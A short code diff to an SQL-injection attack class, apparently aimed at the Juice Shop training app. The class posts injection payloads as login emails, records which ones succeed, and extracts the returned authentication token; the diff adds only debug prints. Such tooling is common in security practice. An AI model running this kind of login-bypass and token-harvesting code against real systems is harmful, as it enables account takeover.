@@ -24,6 +24,7 @@ class SQL_injector(a.attack_inter):
                 line = line.rstrip()
                 headers, json_data = self.generator(line)
                 response = self.juice_session.post(self.url, json=json_data, verify=False)
+                print(response.status_code)
                 if response.status_code == 200:
                     res_payload_dict = response.json()
                     print("Valid script: ", json_data['email'])
@@ -39,7 +40,9 @@ class SQL_injector(a.attack_inter):
         else:
             headers, json_data = self.generator(userInput)
             response = self.juice_session.post(self.url, json=json_data)
+            print(response.status_code)
             if response.status_code == 200:
+                print(response.text)
                 res_payload_dict = response.json()
                 print("Valid script: ", json_data['email'])
                 new_token = res_payload_dict["authentication"]['token']
